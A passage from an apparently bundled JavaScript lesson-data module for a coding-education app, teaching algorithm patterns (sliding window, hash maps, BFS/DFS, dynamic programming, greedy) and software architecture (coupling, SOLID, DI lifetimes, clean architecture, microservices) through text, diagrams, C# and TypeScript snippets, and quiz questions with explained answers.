sum does one add and one subtract per step. That is O(n) instead of O(n × k)."},{id:"algorithms.two-pointers.4",kind:"code",difficulty:"medium",prompt:"This finds the largest sum of 2 items in a row. What does it print?",code:{lang:"ts",text:`const a = [4, 2, 7, 1, 8];
let sum = a[0] + a[1];
let best = sum;
for (let i = 2; i < a.length; i++) {
  sum += a[i] - a[i - 2];
  best = Math.max(best, sum);
}
console.log(best);`},choices:["6","8","9","15"],answer:2,why:"The windows are 4+2=6, 2+7=9, 7+1=8 and 1+8=9. The largest is 9. Each step adds the new item and drops the one two places back."}]},{id:"algorithms.hash-map",title:"Hash map tricks",summary:"Remember what you have seen and turn O(n²) into O(n).",minutes:4,blocks:[{type:"text",text:'A **hash map** (C# `Dictionary`, TypeScript `Map`) finds a key in about one step on average: **O(1)**. Many "compare every pair" problems become one pass. Store what you have seen, then ask the map.'},{type:"diagram",text:`two-sum: find two numbers with sum 9
the array is NOT sorted: [4, 7, 1, 5]

i  num  need  in map?  map (num → index)
0   4    5     no      {4:0}
1   7    2     no      {4:0, 7:1}
2   1    8     no      {4:0, 7:1, 1:2}
3   5    4     yes     4 is at index 0
                → answer [0, 3]

need = 9 - num`},{type:"code",code:{lang:"ts",text:`function twoSum(nums: number[], target: number) {
  const seen = new Map<number, number>();
  for (let i = 0; i < nums.length; i++) {
    const j = seen.get(target - nums[i]);
    if (j !== undefined) return [j, i];
    seen.set(nums[i], i);  // value → index
  }
  return null;
}`}},{type:"compare",left:{title:"Nested loops",items:["10,000 items → about 50 million pairs","No extra memory","Fine for tiny lists"]},right:{title:"Hash map",items:["10,000 items → about 10,000 steps","Uses extra memory for the map","Keys need correct equality"]}},{type:"diagram",text:`count letters in "banana"

read b → {b:1}
read a → {b:1, a:1}
read n → {b:1, a:1, n:1}
read a → {b:1, a:2, n:1}
read n → {b:1, a:2, n:2}
read a → {b:1, a:3, n:2}
one pass: O(n)`},{type:"code",code:{lang:"csharp",text:`var words = new[] { "red", "blue", "red" };

// Count: red → 2, blue → 1
var count = new Dictionary<string, int>();
foreach (var w in words)
    count[w] = count.GetValueOrDefault(w) + 1;

// Remove duplicates
var unique = new HashSet<string>(words);

// Group: first letter → words
var byLetter = words.GroupBy(w => w[0]);`}},{type:"list",items:["In TypeScript, `[...new Set(items)]` removes duplicates and keeps the first-seen order.","A TypeScript `Map` compares object keys by **reference**: two equal-looking objects are two different keys.","In C#, a class used as a key needs `Equals` and `GetHashCode`. Without them, only the same object matches.","Do not change a key after you add it. The map will look in the wrong place."]},{type:"example",title:"Customer import",text:"You import 50,000 new customers and skip emails that already exist. There are 200,000 existing customers. Nested loops mean 10 billion compares. Load the existing emails into a `HashSet` first, then check each new row once."}],remember:'"Have I seen this before?" → put it in a hash map or set.',questions:[{id:"algorithms.hash-map.1",kind:"perf",difficulty:"medium",prompt:"This code finds duplicate emails in 100,000 users. It takes minutes. What is the best fix?",code:{lang:"csharp",text:`var dupes = new List<string>();
for (int i = 0; i < users.Count; i++)
    for (int j = i + 1; j < users.Count; j++)
        if (users[i].Email == users[j].Email)
            dupes.Add(users[i].Email);`},choices:["Use a `HashSet<string>`: if `Add` returns false, it is a duplicate","Use `StringComparison.Ordinal` to compare the emails faster","Start the inner loop at `j = i` instead of `j = i + 1`","Run the outer loop with `Parallel.For` on all CPU cores"],answer:0,why:"Nested loops compare about 5 billion pairs: O(n²). A HashSet checks each email in about one step, so O(n) in total.",remember:"Duplicate check → HashSet, not nested loops."},{id:"algorithms.hash-map.2",kind:"code",difficulty:"easy",prompt:"What does this print?",code:{lang:"ts",text:`const count = new Map<string, number>();
for (const c of "hello") {
  count.set(c, (count.get(c) ?? 0) + 1);
}
console.log(count.get("l"), count.size);`},choices:["2 4","2 5","1 4","3 4"],answer:0,why:'"hello" has the letters h, e, l, o, so the map has 4 keys. The letter "l" appears twice, so its count is 2.'},{id:"algorithms.hash-map.3",kind:"debug",difficulty:"hard",prompt:"This prints `undefined`. Why?",code:{lang:"ts",text:`const stock = new Map<{ sku: string }, number>();
stock.set({ sku: "A1" }, 5);
console.log(stock.get({ sku: "A1" }));`},choices:["Map compares object keys by reference; these are two objects","Map keys must be numbers or strings, so objects are ignored","`get` runs before `set` is done, because Map is async",'The value 5 is stored under the key "sku" instead'],answer:0,why:'The two `{ sku: "A1" }` literals create two different objects. A `Map` finds an object key only if it is the same object. Use the string `"A1"` as the key.'},{id:"algorithms.hash-map.4",kind:"compare",difficulty:"easy",prompt:"You must check if a list of 1 million ids has any duplicate. Which is better?",choices:["Compare every id with every other id","Add each id to a set; stop when it is already there"],answer:1,why:"Comparing every pair is about 500 billion checks. A set needs about 1 million steps. It uses some extra memory, which is a fair trade here."}]},{id:"algorithms.bfs-dfs",title:"BFS and DFS",summary:"Visit everything that is connected: level by level, or deep first.",minutes:5,blocks:[{type:"text",text:"**BFS** (breadth-first search) visits level by level. It uses a **queue**: first in, first out. **DFS** (depth-first search) goes as deep as it can first. It uses a **stack** (last in, first out) or recursion."},{type:"diagram",text:`        A
      ╱   ╲
     B     C
    ╱ ╲     ╲
   D   E     F

BFS: A B C D E F   (level by level)
DFS: A B D E C F   (one branch first)

BFS queue, step by step:
take   queue after adding children
 -     [A]
 A     [B C]
 B     [C D E]
 C     [D E F]
 D     [E F]   ...and so on`},{type:"code",code:{lang:"csharp",text:`// DFS with a stack: find a file in folders
string? FindPath(Folder root, string name)
{
    var stack = new Stack<Folder>();
    stack.Push(root);
    while (stack.Count > 0)
    {
        var f = stack.Pop();   // newest first
        if (f.Files.Contains(name)) return f.Path;
        foreach (var sub in f.Children)
            stack.Push(sub);
    }
    return null;
}
// Swap Stack for Queue → it becomes BFS`}},{type:"text",text:"A grid is a graph too. Each cell is a node, and its neighbours are up, down, left and right. BFS reaches cells in order of distance. So the first time it reaches the goal, that path is the shortest."},{type:"diagram",text:`S = start, G = goal, # = wall
numbers = steps from S, found by BFS

┌───┬───┬───┬───┐
│ S │ 1 │ 2 │ 3 │
├───┼───┼───┼───┤
│ 1 │ # │ # │ 4 │
├───┼───┼───┼───┤
│ 2 │ 3 │ # │ G │
└───┴───┴───┴───┘
G is reached at step 5 → shortest path`},{type:"code",code:{lang:"ts",text:`const dirs = [[1, 0], [-1, 0], [0, 1], [0, -1]];

function bfs(g: string[], r0: number, c0: number) {
  const seen = new Set([r0 + "," + c0]);
  const queue = [[r0, c0, 0]];  // row, col, dist
  for (let i = 0; i < queue.length; i++) {
    const [r, c, d] = queue[i];
    if (g[r][c] === "G") return d;
    for (const [dr, dc] of dirs) {
      const nr = r + dr, nc = c + dc;
      const key = nr + "," + nc;
      const cell = g[nr]?.[nc];
      if (cell === undefined) continue;  // outside
      if (cell === "#" || seen.has(key)) continue;
      seen.add(key);             // the visited set
      queue.push([nr, nc, d + 1]);
    }
  }
  return -1;                     // no path
}`}},{type:"text",text:"The **visited set** stops the search from adding the same node again. Graphs can have cycles, so without it the search may never end. BFS finds the shortest path only when every step costs the same. For roads with different lengths, use Dijkstra's algorithm."},{type:"example",title:"People you may know",text:'A social app suggests "friends of friends". It runs BFS from you and stops at level 2. Level 1 is your friends. Level 2 is their friends that you do not know yet.'}],remember:"BFS = queue, level by level, shortest path when steps cost the same. DFS = stack. Always keep a visited set.",questions:[{id:"algorithms.bfs-dfs.1",kind:"scenario",difficulty:"easy",prompt:"A website has pages and links, and every link is one click. You want the fewest clicks from the home page to the help page. Which search fits?",choices:["BFS, because it explores pages level by level","DFS, because it follows one path deep first","Binary search over the sorted page addresses","Sort the pages by name, then scan them all"],answer:0,why:"BFS reaches all pages 1 click away, then 2 clicks, and so on. The first time it reaches the help page is the shortest route. DFS may find a long path first."},{id:"algorithms.bfs-dfs.2",kind:"debug",difficulty:"medium",prompt:"A BFS on a road network never finishes, and memory keeps growing. Every road goes both ways. What is the most likely bug?",choices:["No visited set, so cities are added again and again","The queue must be a stack for road networks","BFS only works on trees, so a road graph breaks it","The start city was added to the queue twice"],answer:0,why:"A road from A to B also goes from B to A. Without a visited set, A adds B, B adds A, and so on forever. Mark a node as visited when you add it.",remember:"Graph search → always keep a visited set."},{id:"algorithms.bfs-dfs.3",kind:"truefalse",difficulty:"medium",prompt:"BFS gives the shortest route on a road map where each road has a different length in km.",choices:["True","False"],answer:1,why:"BFS counts steps, not km. One long road can be worse than three short ones. For weighted edges, use Dijkstra's algorithm."},{id:"algorithms.bfs-dfs.4",kind:"compare",difficulty:"hard",prompt:"You change the BFS grid code to use a stack instead of a queue. Everything else stays the same. What changes?",choices:["It still reaches the goal, but not always by the shortest path","Nothing: a stack and a queue visit cells in the same order","It can no longer reach cells that are behind walls","It now runs in O(n²) time instead of O(n) time"],answer:0,why:"A stack takes the newest cell first, so the search goes deep. It still visits every reachable cell. But the first path to the goal may be long."},{id:"algorithms.bfs-dfs.5",kind:"perf",difficulty:"medium",prompt:"A TypeScript BFS on a 1,000 × 1,000 grid is very slow. It uses `queue.shift()` to take the next cell. What is the likely cause?",choices:["`shift()` can move all remaining items, so each call may cost O(n)","`shift()` returns the newest item, so the BFS acts like a DFS","Arrays in TypeScript slow down after 65,536 items","The visited set uses strings, which are slow to hash"],answer:0,why:"Removing the first item shifts the rest down by one. Use an index that moves forward, like the grid code above. In C#, `Queue<T>` does this for you."}]},{id:"algorithms.dp-greedy",title:"Dynamic programming and greedy",summary:'Save answers you already know. Know when "take the biggest" fails.',minutes:5,blocks:[{type:"text",text:"Simple recursive Fibonacci is `fib(n) = fib(n - 1) + fib(n - 2)`. It solves the same small problems again and again. The number of calls grows exponentially."},{type:"diagram",text:`fib(5) without saving answers

               fib(5)
            ╱          ╲
        fib(4)        fib(3)
        ╱    ╲        ╱    ╲
    fib(3)  fib(2) fib(2) fib(1)
    ╱    ╲
fib(2)  fib(1)

fib(3) runs 2 times, fib(2) runs 3 times
fib(50) → about 40 billion calls`},{type:"text",text:"**Dynamic programming** (DP) solves each small problem once and saves the answer. **Memoization** is the top-down style: recursion plus a cache. **Bottom-up** fills a table, starting from the smallest case."},{type:"code",code:{lang:"ts",text:`const memo = new Map<number, number>();
function fib(n: number): number {
  if (n <= 1) return n;
  const saved = memo.get(n);
  if (saved !== undefined) return saved;
  const result = fib(n - 1) + fib(n - 2);
  memo.set(n, result);       // save for next time
  return result;
}`}},{type:"diagram",text:`bottom-up: fill the table left to right

n:    0   1   2   3   4   5   6
    ┌───┬───┬───┬───┬───┬───┬───┐
fib:│ 0 │ 1 │ 1 │ 2 │ 3 │ 5 │ 8 │
    └───┴───┴───┴───┴───┴───┴───┘
each cell = sum of the two before it
O(n) steps, no recursion`},{type:"text",text:"A **greedy** algorithm takes the best-looking choice at each step and never goes back. It is fast and simple, but not always correct. Coin change is the classic example: take the biggest coin that fits."},{type:"diagram",text:`make 6 with coins {1, 3, 4}

greedy (biggest coin first):
  take 4 → 2 left
  take 1 → 1 left
  take 1 → 0 left     = 3 coins

best: 3 + 3           = 2 coins

coins {1, 2, 5, 10}: greedy is best
coins {1, 3, 4}:     greedy is wrong`},{type:"code",code:{lang:"csharp",text:`// DP: fewest coins for amount; -1 if impossible
int MinCoins(int[] coins, int amount)
{
    const int No = int.MaxValue;
    var best = new int[amount + 1];
    Array.Fill(best, No);
    best[0] = 0;
    for (int a = 1; a <= amount; a++)
        foreach (var c in coins)
        {
            if (c > a) continue;
            if (best[a - c] == No) continue;
            int take = best[a - c] + 1;
            if (take < best[a]) best[a] = take;
        }
    return best[amount] == No ? -1 : best[amount];
}`}},{type:"example",title:"Vending machine",text:"A vending machine gives change with normal coins, for example 1, 2, 5 and 10. Greedy works there and is fast. A game shop then adds a coin worth 4. Now test greedy again, or switch to DP."}],remember:"Same small problem again and again → save the answer (DP). Greedy only when you can prove it works.",questions:[{id:"algorithms.dp-greedy.1",kind:"perf",difficulty:"medium",prompt:"A simple recursive `fib(45)` takes many seconds. What is the best fix?",choices:["Save each answer (memoization) or use a bottom-up loop","Use `long` instead of `int` for the return value","Run the two recursive calls in parallel threads","Add a `try/catch` around the recursive calls"],answer:0,why:"The slow part is repeated work: `fib(43)`, `fib(42)` and the rest run again and again. Saving answers makes it O(n)."},{id:"algorithms.dp-greedy.2",kind:"scenario",difficulty:"hard",prompt:"Greedy (biggest coin first) makes 12 with coins {1, 6, 10}. How many coins does it use, and what is the best answer?",choices:["Greedy uses 3 coins; the best is 2 (6 + 6)","Greedy uses 2 coins; greedy is the best here","Greedy uses 3 coins; 3 is also the best","Greedy uses 4 coins; the best is 3 coins"],answer:0,why:"Greedy takes 10, then 1 and 1: 3 coins. But 6 + 6 needs only 2. Taking the biggest coin first blocked the better choice.",remember:"Greedy can be wrong. Try a small counterexample."},{id:"algorithms.dp-greedy.3",kind:"debug",difficulty:"hard",prompt:'A memoized recursive function works for n = 1,000. For n = 100,000 it crashes with "Maximum call stack size exceeded". Why?',choices:["The first call still goes 100,000 calls deep before any answer is saved","The memo map is full and cannot hold more than 65,536 keys","Memoization only works for numbers smaller than 10,000","The cache returns old answers that cause an endless loop"],answer:0,why:"Memoization removes repeated work, but not the depth of the first call chain. A bottom-up loop needs no recursion, so it has no depth limit."},{id:"algorithms.dp-greedy.4",kind:"truefalse",difficulty:"medium",prompt:"Memoization speeds code up only when the same smaller problems come back again and again.",choices:["True","False"],answer:0,why:"A saved answer helps only if you need it again. If every small problem is different, the cache just uses memory."}]}],cheatSheet:[{title:"Searching",items:[{term:"Linear search",meaning:"Check items one by one: O(n), works on any order"},{term:"Binary search",meaning:"Check the middle, drop half: O(log n), needs sorted data"},{term:"lo + (hi - lo) / 2",meaning:"Safe middle index; `(lo + hi) / 2` can overflow in C#"},{term:"while (lo <= hi)",meaning:"Goes with `hi = length - 1`; use `mid + 1` and `mid - 1`"},{term:"Array.BinarySearch",meaning:"Returns the index, or a negative number if not found"}]},{title:"Sorting",items:[{term:"Insertion / bubble sort",meaning:"O(n²); fine only for tiny or almost-sorted lists"},{term:"Merge sort",meaning:"Split, then merge sorted halves: O(n log n), extra memory"},{term:"Quick sort",meaning:"Split around a pivot: O(n log n) average, O(n²) worst"},{term:"Stable sort",meaning:"Equal items keep their original order (LINQ `OrderBy`)"},{term:"JS sort()",meaning:"Compares as strings! Use `(a, b) => a - b` for numbers"},{term:"C# comparator",meaning:"Use `a.CompareTo(b)`, not `a - b`, which can overflow"}]},{title:"Patterns",items:[{term:"Recursion",meaning:"Base case + smaller step; too deep → stack overflow"},{term:"Two pointers",meaning:"Two indexes move through sorted data: pair sum in O(n)"},{term:"Sliding window",meaning:"Add the new item, drop the old one; keep a running total"},{term:"Hash map / set",meaning:'"Seen it before?" in O(1); turns O(n²) into O(n)'},{term:"BFS",meaning:"Queue, level by level; shortest path when steps cost the same"},{term:"DFS",meaning:"Stack or recursion; goes deep first"},{term:"Visited set",meaning:"Stops graph searches from looping forever on cycles"}]},{title:"DP and greedy",items:[{term:"Memoization",meaning:"Recursion plus a cache of answers (top-down)"},{term:"Bottom-up DP",meaning:"Fill a table from the smallest case; no deep recursion"},{term:"Greedy",meaning:"Take the best-looking choice each step; fast, not always right"},{term:"Coin trap",meaning:"Coins {1, 3, 4}, amount 6: greedy uses 3 coins, best is 2"}]}]},l=Object.freeze(Object.defineProperty({__proto__:null,default:c},Symbol.toStringTag,{value:"Module"})),d={id:"architecture",title:"Architecture",emoji:"🏗️",tagline:"Structure, boundaries and trade-offs",lessons:[{id:"architecture.coupling-cohesion",title:"Coupling and cohesion",summary:"The two ideas behind almost every design rule.",minutes:3,blocks:[{type:"text",text:`Almost every architecture idea tries to improve two things:
**Coupling** = how much one part depends on another part.
**Cohesion** = how well the things inside one part belong together.`},{type:"diagram",text:`Goal: LOW coupling, HIGH cohesion

┌─ Orders ────────┐         ┌─ Billing ───────┐
│ CreateOrder     │         │ CreateInvoice   │
│ CancelOrder     │ ──────► │ GetInvoice      │
│ OrderRules      │  small  │ InvoiceRules    │
└─────────────────┘   API   └─────────────────┘
related code together      one narrow connection`},{type:"example",title:"Hidden coupling",text:"The Reports code reads the Billing tables directly with SQL. The Billing team renames a column. Reports breaks in production — and the Billing team did not even know Reports used that table."},{type:"compare",left:{title:"Low cohesion ⚠️",items:["`Utils.cs` with 80 unrelated methods",'A "Helpers" folder for everything',"One feature change touches 10 folders"]},right:{title:"High cohesion ✅",items:["A folder per feature: `Orders/`, `Billing/`","Code that changes together lives together","One feature change touches one place"]}},{type:"text",text:"Coupling is never zero, because parts must talk to each other. So depend on **small, stable contracts**: an interface, an API, an event. A contract is what a part promises to keep the same. Do not depend on another part's internals, like its tables or private classes."}],remember:"Keep related code together. Depend on contracts, not internals.",questions:[{id:"architecture.coupling-cohesion.1",kind:"scenario",difficulty:"medium",prompt:'Adding a small "gift wrap" option needs edits in 9 files across `Controllers/`, `Services/`, `Repositories/`, `Dtos/` and `Validators/`. What does this suggest?',choices:["The app is too big and should be split into microservices","One feature is spread across many places (low cohesion)","The team needs more developers to handle this many files","Nothing: splitting code by technical layer is always ideal"],answer:1,why:"When one small feature touches many folders, related code is not kept together. Grouping by feature (for example `Orders/GiftWrap`) often helps. Microservices would spread it even further."},{id:"architecture.coupling-cohesion.2",kind:"debug",difficulty:"medium",prompt:"The Billing team renames a column in their `Invoices` table. The next day the Reports module crashes, even though nobody touched Reports. What is the root problem?",choices:["SQL Server does not allow renaming a column that has data in it","Reports had too many unit tests, and they broke after the rename","Reports reads Billing's table directly — hidden tight coupling","The new column name is too long for SQL Server to handle"],answer:2,why:"Reports depended on Billing's internal storage, not on a contract. Billing could not know about it. If Reports used a Billing API or view, the rename would be safe.",remember:"Another module's tables are its internals. Use its API."},{id:"architecture.coupling-cohesion.3",kind:"mcq",difficulty:"easy",prompt:"Which is the best sign of **high cohesion**?",choices:["A `Helpers` class used by every module","A class with 3,000 lines that does everything","Every module calls every other module","Code that changes together lives together"],answer:3,why:"High cohesion means the things in one place belong to one job. Then a change stays in one place instead of spreading out."}]},{id:"architecture.solid",title:"SOLID, the practical version",summary:"Five good questions — not five laws.",minutes:4,blocks:[{type:"text",text:"SOLID is five guidelines for designing classes. Use them as **questions to ask**, not as laws to obey."},{type:"list",items:["**S — Single responsibility**: one reason to change. `InvoiceService` should not also send emails and resize images.","**O — Open/closed**: add new behaviour by adding code, not by editing a huge `switch` every time.","**L — Liskov substitution**: a subclass must work everywhere its base class works.","**I — Interface segregation**: small interfaces. A class that only reads should not have to implement `Delete()`.","**D — Dependency inversion**: depend on abstractions (interfaces), not concrete classes. `OrderService` asks for `IPaymentGateway`, not `new StripeClient()`."]},{type:"code",code:{lang:"csharp",text:`// ❌ every new payment type = edit this switch
decimal Fee(string type) => type switch
{
    "card"   => 0.30m,
    "paypal" => 0.50m,
    _ => throw new NotSupportedException(type)
};

// ✅ new type = new class, old code untouched
public interface IPaymentMethod { decimal Fee(); }

public class Card : IPaymentMethod
{
    public decimal Fee() => 0.30m;
}`}},{type:"compare",left:{title:"Worth it when",items:["The code changes often","Many people work on it","You need to test parts alone"]},right:{title:"Too much when",items:["A switch with 2 cases that never change","An interface with one class, forever","A 50-line script"]}},{type:"text",text:"Too much SOLID creates a new problem: 40 tiny classes and interfaces to follow one simple feature. Simple code with a little repetition is often better than clever, abstract code. AI tools often generate extra layers. Ask if each layer is worth its cost."}],remember:"SOLID = good questions, not laws. Add abstraction only when it is worth its cost.",questions:[{id:"architecture.solid.1",kind:"code",difficulty:"hard",prompt:"Code that takes a `FileStorage` crashes when it receives a `ReadOnlyStorage`. What is the design problem?",code:{lang:"csharp",text:`public class FileStorage
{
    public virtual void Save(string path, byte[] data)
    { /* write file */ }
}

public class ReadOnlyStorage : FileStorage
{
    public override void Save(string path, byte[] data)
        => throw new NotSupportedException();
}`},choices:["It should throw InvalidOperationException, not NotSupportedException","The subclass breaks the base class promise, so it cannot replace it","Virtual methods are slow, so Save should not be overridden at all","Save should be async; then ReadOnlyStorage would work correctly"],answer:1,why:"Callers expect any `FileStorage` to save. `ReadOnlyStorage` breaks that promise (Liskov substitution). Better: a separate `IReadableStorage` and `IWritableStorage`.",remember:'A subclass that throws "not supported" is a warning sign.'},{id:"architecture.solid.2",kind:"scenario",difficulty:"medium",prompt:"An AI tool generated `IUserNameFormatter`, `UserNameFormatterFactory` and `DefaultUserNameFormatter` — just to join first and last name. There is one implementation and no plan for more. Keep it?",choices:["Yes, more interfaces always mean better design","Yes, SOLID requires an interface for every class","Probably not: a simple method is easier to read and change","No, it should be its own microservice"],answer:2,why:"Abstractions have a cost: more files, and more jumping between files to understand simple code. With one implementation and no need to replace it, a plain method is enough. You can add the interface later if needed.",remember:"Abstraction has a cost. Add it when you need it."},{id:"architecture.solid.3",kind:"compare",difficulty:"medium",prompt:"Shipping cost: today there are 2 carriers. The business plans to add 6 more this year, each with its own rules. Which design fits better?",choices:["One method with a `switch` on the carrier name that keeps growing","An `IShippingCarrier` interface with one class per carrier"],answer:1,why:"Rules will grow and change often. One class per carrier keeps each carrier's rules apart and lets you add new ones without touching the old ones. For 2 fixed cases a switch would be fine."}]},{id:"architecture.di",title:"Dependency injection and lifetimes",summary:"Constructor injection — and the singleton + DbContext trap.",minutes:5,blocks:[{type:"text",text:"**Dependency injection (DI)** means a class does not create its own dependencies. It asks for them in the **constructor**, and the framework passes them in."},{type:"code",code:{lang:"csharp",text:`public class OrderService
{
    private readonly IPaymentGateway _payments;
    private readonly AppDbContext _db;

    // the DI container passes these in
    public OrderService(IPaymentGateway payments,
                        AppDbContext db)
    {
        _payments = payments;
        _db = db;
    }
}`}},{type:"text",text:"Why do this? In tests you pass a **fake** payment gateway instead of charging real cards. Also, all the wiring (which class gets which dependency) is in one place, `Program.cs`. You do not write `new` everywhere.\nEach registered service also has a **lifetime**: how long one instance lives."},{type:"diagram",text:`Lifetime    One instance per...   Typical use
Singleton   whole app, forever    config, IMemoryCache
Scoped      HTTP request          DbContext
Transient   every injection       small stateless helpers`},{type:"text",text:"**The main rule**: a service must not hold a dependency that lives **shorter** than itself."},{type:"code",code:{lang:"csharp",text:`builder.Services.AddDbContext<AppDbContext>(); // scoped
builder.Services.AddSingleton<PriceCache>();

public class PriceCache
{
    // ❌ the singleton keeps ONE DbContext forever
    public PriceCache(AppDbContext db) { /* ... */ }
}`}},{type:"list",items:['In Development, ASP.NET Core checks this and throws: "Cannot consume scoped service ... from singleton ...".',"Without that check, one `DbContext` is shared by all requests at once. `DbContext` is **not thread-safe**: two threads must not use it at the same time. Under load, this causes random errors.","It also keeps tracking every entity it loaded → memory grows and data gets stale (old).","Fix: make `PriceCache` scoped. Or inject `IDbContextFactory<AppDbContext>` / `IServiceScopeFactory`, and create a short-lived context per operation."]}],remember:"Never let a singleton hold something scoped, like a DbContext.",questions:[{id:"architecture.di.1",kind:"debug",difficulty:"hard",prompt:`In production, under load, you see random errors:
"A second operation was started on this context instance before a previous operation completed."
With one user it works. What is the most likely cause?`,code:{lang:"csharp",text:`builder.Services.AddDbContext<AppDbContext>();
builder.Services.AddSingleton<ReportService>();

public class ReportService
{
    public ReportService(AppDbContext db) { /* ... */ }
}`},choices:["SQL Server is overloaded","EF Core does not support async queries","The connection string is wrong in production","The singleton holds one DbContext that all requests share"],answer:3,why:"`ReportService` lives forever, so it keeps the first `DbContext` it got. All requests use that one instance at the same time, and `DbContext` is not thread-safe.",remember:"Singleton + DbContext = shared, unsafe, stale."},{id:"architecture.di.2",kind:"mcq",difficulty:"easy",prompt:"Which lifetime is usually right for an EF Core `DbContext` in a web API?",choices:["Singleton, so it is created only once","A static field shared by all classes","Scoped: one per HTTP request","Transient, created by hand in every method"],answer:2,why:"`AddDbContext` registers it as scoped by default. One context per request is short-lived, tracks only that request's data, and is never shared between threads."},{id:"architecture.di.3",kind:"scenario",difficulty:"easy",prompt:"Why does constructor injection make `OrderService` easier to unit test?",choices:["Tests can pass a fake `IPaymentGateway` instead of a real one","DI makes the code run faster, so tests finish in less time","Tests no longer need assertions, because DI checks the wiring","The DI container creates the test cases for each service"],answer:0,why:"The class does not decide which gateway it uses. In a test, you give it a fake gateway that records the call. No real card is charged, and no network is needed."},{id:"architecture.di.4",kind:"code",difficulty:"medium",prompt:"What is the main design problem here?",code:{lang:"csharp",text:`public class OrderService
{
    public async Task PlaceAsync(Order o)
    {
        var gateway = new StripeGateway("sk_live_...");
        await gateway.ChargeAsync(o.Total);
    }
}`},choices:["Charging should happen in the constructor, not inside the method","It always uses Stripe with a live key: hard to test or change","Async methods are not allowed to create new objects with `new`","The method name `PlaceAsync` is too short to be clear to readers"],answer:1,why:"The class creates its own dependency, so a test would charge a real card. The secret key in code is a security problem too. Inject an `IPaymentGateway` and keep keys in configuration."}]},{id:"architecture.layers",title:"Layers and clean architecture",summary:"Keep business rules away from frameworks — when it is worth it.",minutes:4,blocks:[{type:"text",text:"**Layered architecture** splits code by job. Each layer only calls the one below it."},{type:"diagram",text:`Request
   ↓
API layer        controllers, DTOs, auth
   ↓
Business layer   rules: prices, discounts, stock
   ↓
Data layer       EF Core, SQL
   ↓
Database`},{type:"text",text:"**Clean architecture** is also called onion or hexagonal architecture. It changes one thing: the **business rules sit in the middle and depend on nothing**. The database, the web framework and email are details on the outside."},{type:"diagram",text:`┌──────────────────────────────────┐
│ Infrastructure: EF Core, SMTP,   │
│ Stripe, controllers              │
│  ┌────────────────────────────┐  │
│  │ Application: use cases,    │  │
│  │ interfaces (IOrderRepo)    │  │
│  │  ┌──────────────────────┐  │  │
│  │  │ Domain: Order, rules │  │  │
│  │  └──────────────────────┘  │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘
 Dependencies point INWARD only.`},{type:"code",code:{lang:"csharp",text:`// Application (inner) says what it needs
public interface IOrderRepository
{
    Task<Order?> GetAsync(int id);
}

// Infrastructure (outer) implements it with EF Core
public class EfOrderRepository : IOrderRepository
{ /* uses AppDbContext */ }`}},{type:"compare",left:{title:"Worth it when",items:["Business rules are complex and live for years","You want to test rules without a database","Several teams work on the code"]},right:{title:"Too much when",items:["Simple CRUD: form in, row out","5 projects + a mapper for every field","A small internal tool or prototype"]}}],remember:"Rules in the middle, frameworks at the edge — and only as many layers as the problem needs.",questions:[{id:"architecture.layers.1",kind:"code",difficulty:"medium",prompt:"This class lives in the **Domain** project of a clean architecture solution. Which rule is broken?",code:{lang:"csharp",text:`using Microsoft.EntityFrameworkCore;

public class Order
{
    public void Ship(AppDbContext db)
    {
        Status = OrderStatus.Shipped;
        db.SaveChanges();
    }
}`},choices:["The Domain depends on an outer detail (EF Core)","Entities are not allowed to have methods","The Domain should use Dapper instead of EF Core","Nothing is broken, this is fine"],answer:0,why:"In clean architecture the domain knows nothing about databases. `Ship()` should only change the order's state. Saving belongs to an outer layer."},{id:"architecture.layers.2",kind:"scenario",difficulty:"medium",prompt:"A small internal tool has 6 forms that save rows to 6 tables. The tech lead proposes 5 projects, CQRS, and mapping classes for every DTO. What do you think?",choices:["Great: more layers and patterns always mean better code quality","Good idea, but split the 6 forms into 6 microservices instead","Fine: CQRS is required whenever an app writes to a database","Probably too heavy: the cost is bigger than the benefit here"],answer:3,why:"Layers are worth it when rules are complex. For simple CRUD they mostly add files, mapping code and slower changes. A simple, well-organized app is the better fit.",remember:"Match the structure to the problem, not to a template."},{id:"architecture.layers.3",kind:"debug",difficulty:"medium",prompt:"A discount bug was fixed, but customers still see wrong discounts on some pages. You find the discount calculation copied inside 3 different controllers. What is the root problem?",choices:["The discounts table is missing an index, so old values are read","The rule is copied in controllers, not kept in one shared place","The controllers are not async, so they return old discount data","There are too few controllers, so each one does too much work"],answer:1,why:"Rules in the API layer get copied, and fixes miss some copies. Put the discount rule in one place in the business/domain layer and call it from every controller."}]},{id:"architecture.monolith-microservices",title:"Monolith, modular monolith, microservices",summary:"Microservices are not automatically better.",minutes:5,blocks:[{type:"text",text:"**Microservices are not automatically better than a monolith.** They solve some problems and create new ones."},{type:"diagram",text:`               Monolith    Modular      Micro-
                           monolith     services
Deploys        1           1            many
Data           1 DB        1 DB, split  1 DB each
                           by module
Calls between  in-process  in-process   network
Fits           small team  most teams   many teams
Ops effort     low         low          high`},{type:"list",items:['**Monolith** — one app, one deploy. Simple to build, test, debug and deploy. Risk: without clear boundaries, it becomes a "big ball of mud". That means messy code where everything depends on everything.',"**Modular monolith** — still one deploy, but strong modules. Each module owns its data and offers a small public API to other modules. A good first choice for most teams.","**Microservices** — separate apps, deployed and scaled on their own, talking over the network."]},{type:"compare",left:{title:"Microservices give you",items:["Teams deploy without waiting for each other","Scale one busy part alone","A failure can stay in one service"]},right:{title:"Microservices cost you",items:["Network calls that fail and add latency","No simple transaction across services","Tracing needed to debug one request","Many pipelines, dashboards, on-call"]}},{type:"example",title:"Quick check",text:"Your team has 3 developers and one small application. Do you need 20 microservices? Almost surely **no**. You would spend your time on deployments, network failures and data sync instead of features. Start with a modular monolith. Move a part into its own service only when you have a real reason. For example: a separate team, a part that needs to scale alone, or a very different release speed."},{type:"text",text:"Warning sign: the **distributed monolith** — services that share one database or must be deployed together. You pay all the microservice costs and get none of the benefits."}],remember:"Microservices solve team and scaling problems. Without those problems, you only get the costs.",questions:[{id:"architecture.monolith-microservices.1",kind:"scenario",difficulty:"easy",prompt:"Your team has 3 developers and one small application. Do you need 20 microservices?",choices:["Yes, microservices are the modern standard","Yes, as long as each one has its own database","No: a (modular) monolith is simpler and fits this team","Yes, smaller services always have fewer bugs"],answer:2,why:"With 3 people, 20 services means each person runs about 7 apps to deploy, plus network and data problems. The benefits of microservices (independent teams, separate scaling) do not exist here yet.",remember:"Start simple. Split when you have a real reason."},{id:"architecture.monolith-microservices.2",kind:"debug",difficulty:"medium",prompt:'A company has 12 "microservices". All of them use the same database, and every release must deploy all 12 together in a fixed order. What is this?',choices:["A distributed monolith: the costs without independent deploys","A good microservice design, since each service has its own code","A modular monolith, since all the modules share one database","A serverless 